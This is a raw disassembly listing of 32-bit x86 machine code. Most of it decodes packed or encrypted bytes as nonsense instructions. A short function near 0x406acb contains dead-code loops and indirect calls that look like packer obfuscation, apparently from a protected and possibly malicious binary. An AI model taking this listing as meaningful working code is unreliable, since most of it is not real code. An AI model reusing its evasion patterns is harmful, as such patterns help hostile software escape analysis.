  4068fe:	jmp    0x40690e
  406900:	mov    eax,DWORD PTR [ebp-0x8ef6871]
  406906:	or     eax,0x37d3ad9d
  40690b:	ins    DWORD PTR es:[edi],dx
  40690c:	data16 das 
  40690e:	sbb    eax,DWORD PTR [edx+eiz*1]
  406911:	lock sbb eax,DWORD PTR [eax+edi*1-0x52]
  406916:	push   ds
  406917:	div    DWORD PTR [edx-0x44]
  40691a:	(bad)  
  40691b:	adc    ebp,DWORD PTR [esi+0x5b]
  40691e:	fisubr WORD PTR [ebp+0x78923d3b]
  406924:	clc    
  406925:	les    esi,FWORD PTR [edi-0x2f]
  406928:	cdq    
  406929:	imul   esi,DWORD PTR [eax-0x4b],0x395d6367
  406930:	aam    0x35
  406932:	jl     0x4068ef
  406934:	jmp    0xb7d6:0x3cb45cbd
  40693b:	mov    ds:0xfe4f258b,eax
  406940:	add    ebp,ebp
  406942:	leave  
  406943:	push   0xfffffff6
  406945:	fadd   QWORD PTR [ebx+0x40]
  406948:	add    bh,BYTE PTR [edx+0x2c]
  40694b:	jae    0x4068d1
  40694d:	(bad)  
  40694e:	shl    BYTE PTR [edx],cl
  406950:	and    BYTE PTR [ebx-0x6a984472],al
  406956:	mov    ds:0xf9789f79,eax
  40695b:	xor    DWORD PTR [ebx-0x6c],eax
  40695e:	push   ebp
  40695f:	mov    cl,0xee
  406961:	push   edx
  406962:	pop    ecx
  406963:	mov    ebp,0x9169b48d
  406968:	aam    0xb2
  40696a:	outs   dx,DWORD PTR ds:[esi]
  40696b:	add    BYTE PTR [ecx-0x7],ch
  40696e:	push   cs
  40696f:	inc    esp
  406970:	retf   
  406971:	cmp    BYTE PTR [ebp+eax*8-0x5d314399],0x7f
  406979:	mov    esi,0xe4ded858
  40697e:	sub    esp,DWORD PTR [eax]
  406980:	xor    eax,DWORD PTR [esi+0xe]
  406983:	std    
  406984:	pop    es
  406985:	pop    ds
  406986:	inc    ebp
  406987:	dec    ebp
  406988:	xchg   ch,dh
  40698a:	jmp    0x4069a4
  40698c:	push   edi
  40698d:	cmp    al,0xf6
  40698f:	dec    eax
  406990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406991:	in     eax,dx
  406992:	push   edx
  406993:	adc    BYTE PTR [eax+0x75],0x25
  406997:	je     0x406938
  406999:	rep ins BYTE PTR es:[edi],dx
  40699b:	loop   0x4069b7
  40699d:	loop   0x406a05
  40699f:	xor    dh,dh
  4069a1:	push   0xe0100af
  4069a6:	add    al,0xed
  4069a8:	mov    ah,0x50
  4069aa:	in     al,dx
  4069ab:	push   es
  4069ac:	sub    esp,DWORD PTR [ebp-0x56853dbb]
  4069b2:	shl    BYTE PTR [ecx+0x7ddcd93c],1
  4069b8:	mov    al,0x23
  4069ba:	push   0xffffff91
  4069bc:	cmp    eax,0xa09443aa
  4069c1:	push   esi
  4069c2:	fisub  DWORD PTR [edi+0x117dfa49]
  4069c8:	enter  0xac8,0x1f
  4069cc:	rcl    DWORD PTR [edx],1
  4069ce:	call   FWORD PTR [ebx+ebp*4-0x37e01722]
  4069d5:	jl     0x406a55
  4069d7:	or     al,0xdd
  4069d9:	mov    eax,ds:0xad780d36
  4069de:	push   ebp
  4069df:	pop    esi
  4069e0:	nop
  4069e1:	cwde   
  4069e2:	or     eax,0xa22342c0
  4069e7:	xor    DWORD PTR [ebx],0xffffffe7
  4069ea:	cld    
  4069eb:	ja     0x406a03
  4069ed:	jmp    0x406a49
  4069ef:	push   ecx
  4069f0:	or     ecx,DWORD PTR [edi+eiz*1-0x785bc689]
  4069f7:	aam    0x1e
  4069f9:	in     al,dx
  4069fa:	lahf   
  4069fb:	xchg   esp,eax
  4069fc:	push   esi
  4069fd:	dec    ebp
  4069fe:	cmp    eax,0x751f0d94
  406a03:	hlt    
  406a04:	xchg   ecx,eax
  406a05:	pop    edi
  406a06:	push   ebp
  406a07:	or     DWORD PTR [ebx+0x17390c33],eax
  406a0d:	fs pop esi
  406a0f:	fidiv  WORD PTR [edi-0x50]
  406a12:	sar    DWORD PTR [esi],cl
  406a14:	inc    ecx
  406a15:	jbe    0x406a00
  406a17:	dec    ebx
  406a18:	adc    eax,0x8cb5740a
  406a1d:	loopne 0x406a63
  406a1f:	jmp    0xebbd:0x344a56e5
  406a26:	in     eax,0x96
  406a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a29:	loopne 0x406a68
  406a2b:	popa   
  406a2c:	add    BYTE PTR [ebx+0x34d41acb],bl
  406a32:	mov    dh,0xbf
  406a34:	call   0x571606f5
  406a39:	dec    eax
  406a3a:	xchg   DWORD PTR [esi-0x7],ebp
  406a3d:	xchg   esi,eax
  406a3e:	adc    al,0x89
  406a40:	loopne 0x406a7b
  406a42:	lahf   
  406a43:	bound  esi,QWORD PTR [eax-0x624d1d6a]
  406a49:	test   eax,0x5b54d826
  406a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4f:	mov    bl,0x2b
  406a51:	xor    al,0xe
  406a53:	lock mov eax,ds:0x2cd13f20
  406a59:	sub    eax,0xabc0e9fb
  406a5e:	push   edx
  406a5f:	stos   BYTE PTR es:[edi],al
  406a60:	ins    BYTE PTR es:[edi],dx
  406a61:	mov    DWORD PTR [ebx+0xeb616f],ecx
  406a67:	jb     0x406a6c
  406a69:	mov    bh,0xa8
  406a6b:	test   eax,0xdea1aa89
  406a70:	sbb    bh,BYTE PTR [eax-0x5d]
  406a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a74:	mov    ah,0x1
  406a76:	inc    ebx
  406a77:	ret    0x2109
  406a7a:	jne    0x406ac6
  406a7c:	test   eax,0x8fcdc19c
  406a81:	xchg   ebx,eax
  406a82:	sbb    eax,0xbe0a8432
  406a87:	gs jbe 0x406a0b
  406a8a:	es dec ecx
  406a8c:	or     al,cl
  406a8e:	push   ds
  406a8f:	xchg   esp,eax
  406a90:	ret    0xa1c
  406a93:	jmp    0x813f:0xcf0270d2
  406a9a:	addr16 dec edx
  406a9c:	pop    esp
  406a9d:	fidiv  WORD PTR [ecx+0x1]
  406aa0:	(bad)  
  406aa1:	ins    DWORD PTR es:[edi],dx
  406aa2:	pushf  
  406aa3:	sub    BYTE PTR [edi+0x6e856645],ah
  406aa9:	pop    ebp
  406aaa:	ins    DWORD PTR es:[edi],dx
  406aab:	popf   
  406aac:	jnp    0x406a36
  406aae:	imul   ecx,DWORD PTR [ebp-0x10],0xa8b7a650
  406ab5:	adc    al,bl
  406ab7:	rcr    BYTE PTR [ebx+0x5b215d49],0x72
  406abe:	shl    DWORD PTR [esi],0x33
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e7fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fe01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fdd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e7ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fdd9
  406b20:	and    esi,DWORD PTR ds:0x42e228
  406b26:	mov    DWORD PTR ds:0x42fdd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e7f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e7f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e7f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e3df
  406b61:	mov    edi,DWORD PTR ds:0x42e7f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e7f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fdf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fdf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fdf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fdfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e63f
  406bad:	mov    edi,DWORD PTR ds:0x42fdf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fdf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fde5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fde5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fde5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fde5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fde5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fded
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e55b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fe76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fe76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fe76,edi
  406c22:	cmp    DWORD PTR ds:0x42fe76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e807
  406c34:	push   0x42e2a4
  406c39:	call   DWORD PTR ds:0x42e643
  406c3f:	cmp    DWORD PTR ds:0x42fe76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fe76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fe76,edi
  406c59:	cmp    DWORD PTR ds:0x42fe76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e813,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e80b,0x42fe76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x32
  406c9b:	lea    esi,[ebp+0x63]
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406ca5
  406ca7:	lea    edx,[esi+0x3a5ef188]
  406cad:	mov    esi,0xfe5b5a68
  406cb2:	enter  0xc536,0x17
  406cb6:	push   ds
  406cb7:	push   ecx
  406cb8:	sub    dl,dh
  406cba:	push   cs
  406cbb:	es push es
  406cbd:	fnstcw WORD PTR [ebp+0x3b738505]
  406cc3:	fistp  QWORD PTR [edx]
  406cc5:	ret    0xcd0d
  406cc8:	shl    DWORD PTR [ebx-0x33],cl
  406ccb:	add    bh,ah
  406ccd:	mov    dl,BYTE PTR [edx]
  406ccf:	jo     0x406c95
  406cd1:	lock inc ebx
  406cd3:	mov    edx,0x84073041
  406cd8:	fidiv  WORD PTR [eax]
  406cda:	leave  
  406cdb:	loopne 0x406d4b
  406cdd:	retf   0x2f19
  406ce0:	lea    ebp,ds:0xdc74b25a
  406ce6:	xor    ch,BYTE PTR [ecx-0x45]
  406ce9:	mov    edi,0x4d08575e
  406cee:	test   al,0x90
  406cf0:	xchg   esi,eax
  406cf1:	loop   0x406cfe
  406cf3:	push   es
  406cf4:	mov    esi,0x36e919a8
  406cf9:	add    dh,al
  406cfb:	int    0x83
  406cfd:	adc    eax,0x5700c096
  406d02:	jp     0x406d77
  406d04:	icebp  
  406d05:	cmp    DWORD PTR [ebx+0x2a9ede41],edi
  406d0b:	sbb    eax,0xd23f107
  406d10:	aam    0xdf
  406d12:	mov    ebp,esp
  406d14:	in     eax,0x3d
  406d16:	mov    edi,DWORD PTR ds:0x29ca5cc
  406d1c:	dec    esp
  406d1d:	sbb    edx,esp
  406d1f:	mov    ch,0xcd
  406d21:	inc    eax
  406d22:	cs call 0x2e1348ab
  406d28:	mov    ebx,0x656958ec
  406d2d:	mov    ch,0xeb
  406d2f:	and    edi,DWORD PTR [eax]
  406d31:	cmp    al,0xf0
  406d33:	pushf  
  406d34:	lea    ebx,[esi-0x41]
  406d37:	in     eax,0xb1
  406d39:	lods   eax,DWORD PTR ds:[esi]
  406d3a:	loopne 0x406d83
  406d3c:	retf   
  406d3d:	cmp    ebx,eax
  406d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d40:	dec    edx
  406d41:	pop    edx
  406d42:	ins    DWORD PTR es:[edi],dx
  406d43:	cs lahf 
  406d45:	push   es
  406d46:	or     eax,0x5d27330f
  406d4b:	sbb    BYTE PTR [ecx*8+0x4a9055ef],dl
  406d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d53:	or     eax,0x35f6ffa2
  406d58:	cmp    DWORD PTR [ebp+0x24],ecx
  406d5b:	mov    WORD PTR [edi],ds
  406d5d:	xor    DWORD PTR [eax-0xa975e2d],ecx
  406d63:	arpl   cx,cx
  406d65:	xor    eax,0x9be9990f
  406d6a:	push   ds
  406d6b:	pop    es
  406d6c:	imul   edi,DWORD PTR [esi-0x32425064],0xfffffff6
  406d73:	dec    BYTE PTR [edi]
  406d75:	stc    
  406d76:	pushf  
  406d77:	gs je  0x406dda
  406d7a:	repnz test eax,0x63897073
  406d80:	pop    ebx
  406d81:	aaa    
  406d82:	add    al,0x40
  406d84:	add    bl,dl
  406d86:	(bad)  
  406d88:	dec    ebx
  406d89:	mov    bl,0x74
  406d8b:	lods   eax,DWORD PTR ds:[esi]
  406d8c:	jae    0x406ddf
  406d8e:	ins    DWORD PTR es:[edi],dx
  406d8f:	into   
  406d90:	jnp    0x406d39
  406d92:	xor    eax,0x91e8ec6c
  406d97:	inc    ebx
  406d98:	inc    edi
  406d99:	sub    eax,0x793c9074
  406d9e:	mov    edx,0xb1c57583
  406da3:	sbb    ch,BYTE PTR [ecx]
  406da5:	lahf   
  406da6:	hlt    
  406da7:	mov    al,ds:0xa6754478
  406dac:	in     al,0x37
  406dae:	ja     0x406de9
  406db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db1:	mov    esp,0x807c8ae3
  406db6:	pop    ecx
  406db7:	mov    edi,0x556915e
  406dbc:	dec    edx
  406dbd:	scas   eax,DWORD PTR es:[edi]
  406dbe:	loop   0x406dc9
  406dc0:	je     0x406d8f
  406dc2:	mov    eax,ds:0xff03dce0
  406dc7:	jge    0x406d90
  406dc9:	in     al,0xe
  406dcb:	repz fdivr DWORD PTR [ebx+0x52]
  406dcf:	outs   dx,BYTE PTR ds:[esi]
  406dd0:	pop    edx
  406dd1:	dec    esi
  406dd2:	mov    cl,0x58
  406dd4:	jmp    0xb8dc:0xb44470dd
  406ddb:	(bad)  
  406ddc:	cmp    eax,0xaf4fad4d
  406de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de2:	mov    bh,BYTE PTR [edi+0x1e0af832]
  406de8:	sti    
  406de9:	(bad)  
  406dea:	popf   
  406deb:	es cmp al,0xb
  406dee:	(bad)  
  406def:	shl    bh,cl
  406df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df2:	js     0x406def
  406df4:	cmp    al,0x36
  406df6:	mov    db0,edi
  406df9:	cmp    al,0x98
  406dfb:	int    0x5a
  406dfd:	sbb    bl,BYTE PTR [edi]
  406dff:	dec    eax
  406e00:	out    0x4b,eax
  406e02:	cmp    eax,0xb53aa4e8
  406e07:	shl    BYTE PTR [ecx],cl
  406e09:	data16 adc dl,BYTE PTR [esi+0x26]
  406e0d:	or     BYTE PTR [eax-0x6f],dh
  406e10:	nop
  406e11:	cmp    al,0xf1
  406e13:	xor    ebp,DWORD PTR [edi]
  406e15:	push   ecx
  406e16:	mov    eax,ds:0x27722cf3
  406e1b:	or     al,0x67
  406e1d:	mov    esp,0x62626710
  406e22:	adc    cl,BYTE PTR [eax-0x30ef48d9]
  406e28:	retf   
  406e29:	dec    ecx
  406e2a:	xchg   BYTE PTR [edi+edx*4],bh
  406e2d:	xchg   ecx,eax
  406e2e:	pop    eax
  406e2f:	dec    ecx
  406e30:	xor    al,0xa6
  406e32:	add    DWORD PTR [ebx-0x43],edi
  406e35:	sti    
  406e36:	aad    0x16
  406e38:	mov    ah,0x71
  406e3a:	sub    esp,DWORD PTR [edx-0x4]
  406e3d:	fild   WORD PTR [edi]
  406e3f:	pop    edx
  406e40:	imul   eax,DWORD PTR [edx-0x2e],0xe76107ad
  406e47:	cmc    
  406e48:	jne    0x406e77
  406e4a:	sub    DWORD PTR [edi+eiz*1-0x7c],0xffffffe1
  406e4f:	xchg   edi,eax
  406e50:	xlat   BYTE PTR ds:[ebx]
  406e51:	(bad)  
  406e52:	std    
  406e53:	push   0xa29dfb94
  406e58:	jmp    0x406e0c
  406e5a:	(bad)  
  406e5c:	dec    ebp
  406e5d:	or     BYTE PTR [ecx+0x2d],0x9b
  406e61:	or     BYTE PTR [eax],0x93
  406e64:	repnz test eax,0x54cf8784
  406e6a:	cli    
  406e6b:	mov    ah,0x7c
  406e6d:	jmp    0x406e50
  406e6f:	ja     0x406eb1
  406e71:	pop    esi
  406e72:	inc    ecx
  406e73:	mov    ah,0x97
  406e75:	push   es
  406e76:	and    DWORD PTR [ecx+eax*4-0x442e1f0b],0x422708c8
  406e81:	aam    0x49
  406e83:	neg    dh
  406e85:	pop    ebp
  406e86:	loop   0x406e59
  406e88:	pop    edx
  406e89:	ins    DWORD PTR es:[edi],dx
  406e8a:	(bad)  
  406e8b:	jle    0x406e4c
  406e8d:	test   BYTE PTR [ebx+0x79],dh
  406e90:	xor    al,0xf2
  406e92:	aas    
  406e93:	shr    DWORD PTR [edi+0x13fea726],cl
  406e99:	cmp    esp,esp
  406e9b:	inc    DWORD PTR [esi]
  406e9d:	shld   DWORD PTR [eax-0x3e],ebx,cl
  406ea1:	mov    edx,0x954101c0
  406ea6:	pushf  
  406ea7:	leave  
  406ea8:	test   al,0x32
  406eaa:	lahf   
  406eab:	sbb    dl,BYTE PTR [edx+0x5e]
  406eae:	fistp  QWORD PTR [ebp-0x2716a089]
  406eb4:	sbb    DWORD PTR [ebx+0x11],esp
  406eb7:	into   
  406eb8:	jae    0x406ee3
  406eba:	ret    
  406ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebc:	inc    ecx
  406ebd:	(bad)  
  406ebe:	inc    BYTE PTR [edx+0x1b02b50a]
  406ec4:	sbb    BYTE PTR [edx+0x2499bcfe],cl
  406eca:	xchg   esp,ecx
  406ecc:	push   ss
  406ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ece:	pop    edi
  406ecf:	arpl   bp,si
  406ed1:	nop
  406ed2:	jne    0x406edb
  406ed4:	and    bl,BYTE PTR [ecx+ebx*4-0x40799ccb]
  406edb:	cdq    
  406edc:	fwait
  406edd:	repz xchg esp,eax
  406edf:	pop    ecx
  406ee0:	fwait
  406ee1:	repnz dec ebp
  406ee3:	ror    bh,1
  406ee5:	lea    esi,[eax-0x1eb01e45]
  406eeb:	push   0x17
  406eed:	pop    ecx
  406eee:	xchg   BYTE PTR [esi+0x64],bh
  406ef1:	jbe    0x406ee5
  406ef3:	or     DWORD PTR [ebp+0x16bd03b8],ecx
  406ef9:	xor    ch,BYTE PTR [edi-0x7b2cb3b8]
  406eff:	mov    al,0x6f
  406f01:	cmp    eax,0xcbd83ca7
  406f06:	and    DWORD PTR [edx+0x5fa05a30],ebp
  406f0c:	jo     0x406e9a
  406f0e:	test   BYTE PTR [edx],dl
  406f10:	mov    edx,0xdcf43f2f
  406f15:	nop
  406f16:	mov    esi,0x73e9f899
  406f1b:	xchg   DWORD PTR [edx+esi*8],ecx
  406f1e:	mov    bh,0x14
  406f20:	sar    BYTE PTR [edi],cl
  406f22:	mov    cl,0x5e
  406f24:	push   ecx
  406f25:	or     dh,bh
  406f27:	fldl2t 
  406f29:	cmp    ecx,ebp
  406f2b:	or     esp,eax
  406f2d:	fsubr  QWORD PTR [esi]
  406f2f:	mov    edx,0x72b744c6
  406f34:	pop    edi
  406f35:	stc    
  406f36:	leave  
  406f37:	out    0xd1,eax
  406f39:	mov    al,0xc9
  406f3b:	sahf   
  406f3c:	cmp    eax,0xaf305b81
  406f41:	stos   DWORD PTR es:[edi],eax
  406f42:	dec    ecx
  406f43:	cmp    al,0x1a
  406f45:	stos   DWORD PTR es:[edi],eax
  406f46:	call   0x9c8a991d
  406f4b:	pushf  
  406f4c:	sub    edx,ebx
  406f4e:	enter  0xf132,0xe3
  406f52:	into   
  406f53:	push   cs
  406f54:	mov    ds:0xf930c660,al
  406f59:	sbb    eax,0xa0403f4
  406f5e:	outs   dx,BYTE PTR ds:[esi]
  406f5f:	cmp    ebx,DWORD PTR [edx-0x4]
  406f62:	cmc    
  406f63:	hlt    
  406f64:	mov    bh,0x9c
  406f66:	inc    ebp
  406f67:	inc    edx
  406f68:	in     eax,0xd9
  406f6a:	push   edx
  406f6b:	push   ebx
  406f6c:	jmp    0xf89a:0x170da25b
  406f73:	xor    edx,DWORD PTR [ebx+0x42]
  406f76:	aad    0x37
  406f78:	lods   al,BYTE PTR ds:[esi]
  406f79:	fbstp  TBYTE PTR ss:[esi]
  406f7c:	xor    al,0xe8
  406f7e:	retf   
  406f7f:	push   ds
  406f80:	or     al,0xf0
  406f82:	mov    dl,0x5a
  406f84:	js     0x406f70
  406f86:	scas   eax,DWORD PTR es:[edi]
  406f87:	call   0x8a2f:0xd56918f8
  406f8e:	scas   eax,DWORD PTR es:[edi]
  406f8f:	loop   0x406f79
  406f91:	in     al,dx
  406f92:	fdivp  st(5),st
  406f94:	mov    eax,DWORD PTR [ecx]
  406f96:	psubusb mm7,QWORD PTR [edx-0x112d7dfd]
  406f9d:	pusha  
  406f9e:	sub    DWORD PTR [edi-0x18],esp
  406fa1:	cmc    
  406fa2:	retf   
  406fa3:	mov    esp,0xfaf1a0cb
  406fa8:	ja     0x406fc4
  406faa:	sbb    DWORD PTR [edi-0x6],ebp
  406fad:	and    BYTE PTR [edi+0x77e3d2a7],ah
  406fb3:	mov    edx,0x481d302c
  406fb8:	cmp    DWORD PTR [ebx],edi
  406fba:	inc    edx
  406fbb:	xchg   edi,eax
  406fbc:	push   ss
  406fbd:	mov    edx,0xa944e88e
  406fc2:	pop    edx
  406fc3:	push   cs
  406fc4:	psubsw mm7,QWORD PTR [edi]
  406fc7:	push   0xfedf8ec1
  406fcc:	aaa    
  406fcd:	sbb    dl,al
  406fcf:	popa   
  406fd0:	inc    esp
  406fd1:	lods   al,BYTE PTR ds:[esi]
  406fd2:	and    al,0xed
  406fd4:	push   esi
  406fd5:	mov    bh,0x45
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fdf
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	call   0x4607702b
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx+0x1e],sp
  40700d:	push   cs
  40700e:	mov    ch,0xc7
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406fd1
  407018:	mov    al,0x98
  40701a:	aad    0xad
  40701c:	cs inc ecx
  40701e:	out    dx,al
  40701f:	out    0xa7,eax
  407021:	mov    bl,BYTE PTR [edx+edi*8+0xb9864d2]
  407028:	pusha  
  407029:	cld    
  40702a:	sub    al,0x3b
  40702c:	xor    esp,edx
  40702e:	mov    BYTE PTR [ebx],al
  407030:	add    eax,0x4540c211
  407035:	cmp    dh,ch
  407037:	push   edx
  407038:	adc    DWORD PTR [esi],esi
  40703a:	pop    ss
  40703b:	pop    ecx
  40703c:	sbb    BYTE PTR [ebp-0x439a0b7d],cl
  407042:	fs stc 
  407044:	xchg   ecx,eax
  407045:	and    ebx,DWORD PTR [ebp-0x5fede880]
  40704b:	scas   al,BYTE PTR es:[edi]
  40704c:	hlt    
  40704d:	loop   0x40702e
  40704f:	inc    esp
  407050:	cwde   
  407051:	inc    edi
  407052:	sub    esp,ebx
  407054:	xor    al,0x51
  407056:	jecxz  0x406ffe
  407058:	icebp  
  407059:	out    dx,al
  40705a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705b:	and    al,0x29
  40705d:	mov    edx,edx
  40705f:	les    ebx,FWORD PTR [ebp+0x5]
  407062:	xlat   BYTE PTR ds:[ebx]
  407063:	stos   BYTE PTR es:[edi],al
  407064:	das    
  407065:	jg     0x4070c1
  407067:	mov    ebx,0x82600dde
  40706c:	lods   eax,DWORD PTR ds:[esi]
  40706d:	sub    al,0x28
  40706f:	add    DWORD PTR ds:0x839e8e8d,edx
  407075:	in     al,dx
  407076:	adc    esp,DWORD PTR [eax-0x47cd2393]
  40707c:	jo     0x407034
  40707e:	cwde   
  40707f:	sti    
  407080:	push   esp
  407081:	xchg   edx,eax
  407082:	inc    ecx
  407083:	stos   DWORD PTR es:[edi],eax
  407084:	xor    dh,BYTE PTR [ebp+0x50]
  407087:	jb     0x40706b
  407089:	jmp    0x7dddf1ce
  40708e:	and    al,0xfb
  407090:	pop    edi
  407091:	xchg   esp,eax
  407092:	cmp    eax,0x9ae62a6e
  407097:	lahf   
  407098:	or     ch,BYTE PTR [ecx+0x32]
  40709b:	daa    
  40709c:	lea    edi,[edx]
  40709e:	mov    edi,0x7c2725eb
  4070a3:	cmc    
  4070a4:	retf   0xf65e
  4070a7:	and    DWORD PTR [ebx],ecx
  4070a9:	push   esi
  4070aa:	pop    eax
  4070ab:	in     eax,0x9b
  4070ad:	dec    edi
  4070ae:	adc    BYTE PTR [eax+0x44],0x57
  4070b2:	lods   eax,DWORD PTR ds:[esi]
  4070b3:	add    DWORD PTR [edi+0x5dd4d002],edx
  4070b9:	mov    ds:0x4a66b3a,eax
  4070be:	fmul   QWORD PTR [edx-0x14d70826]
  4070c4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4070c6:	dec    ebx
  4070c7:	or     al,BYTE PTR [ebx]
  4070c9:	scas   al,BYTE PTR es:[edi]
  4070ca:	test   dh,0x3b
  4070cd:	aam    0x26
  4070cf:	push   ecx
  4070d0:	mov    al,ds:0xe3273b09
  4070d5:	pop    ecx
  4070d6:	pop    eax
  4070d7:	hlt    
  4070d8:	ret    0x53b4
  4070db:	and    DWORD PTR [esi+0x7bfe8ac9],esp
  4070e1:	pop    esi
  4070e2:	rcl    BYTE PTR [edx+0x4a],cl
  4070e5:	jle    0x40709c
  4070e7:	mov    cl,0x80
  4070e9:	dec    ecx
  4070ea:	mov    cl,0xae
  4070ec:	dec    ebx
  4070ed:	mov    ds:0x876fd0c2,al
  4070f2:	inc    ebx
  4070f3:	into   
  4070f4:	cmp    al,0xa7
  4070f6:	dec    ebx
  4070f7:	jb     0x4070a6
  4070f9:	cmp    al,0xa
  4070fb:	int    0xa0
  4070fd:	sbb    dl,BYTE PTR [ecx-0x4f31741c]
  407103:	test   al,0xc8
  407105:	mov    ds:0x4792b437,eax
  40710a:	test   eax,0xec127147
  40710f:	push   esi
  407110:	jle    0x4070dd
  407112:	sub    DWORD PTR [edx-0x3b094b5c],eax
  407118:	aam    0x38
  40711a:	jle    0x4070de
  40711c:	pop    edi
  40711d:	call   0x8b6c:0x583749e
  407124:	mov    dh,BYTE PTR [edx-0x4c50c222]
  40712a:	in     al,dx
  40712b:	data16 jne 0x40710c
  40712e:	aas    
  40712f:	call   0x7647:0xeabcb3c
  407136:	mov    eax,0x627ebc99
  40713b:	add    ch,0x86
  40713e:	jle    0x40713c
  407140:	inc    esp
  407141:	adc    BYTE PTR [edx],dh
  407143:	cmp    DWORD PTR [edx],esi
  407145:	and    eax,0xb0eeb6e9
  40714a:	inc    ebp
  40714b:	sbb    bl,bh
  40714d:	iret   
  40714e:	inc    edi
  40714f:	cs mov cl,0x16
  407152:	loope  0x407176
  407154:	ins    BYTE PTR es:[edi],dx
  407155:	rol    bl,cl
  407157:	das    
  407158:	cld    
  407159:	inc    ebx
  40715a:	sub    eax,0x610c1c6e
  40715f:	ins    BYTE PTR es:[edi],dx
  407160:	pop    es
  407161:	pop    ss
  407162:	mov    ebx,edi
  407164:	es loopne 0x4071cf
  407167:	adc    cl,BYTE PTR [ebx-0x7a]
  40716a:	pop    ebx
  40716b:	push   ecx
  40716c:	pop    ss
  40716d:	fs retf 0xca24
  407171:	aaa    
  407172:	btr    DWORD PTR [edx+0x5edd8540],0xb8
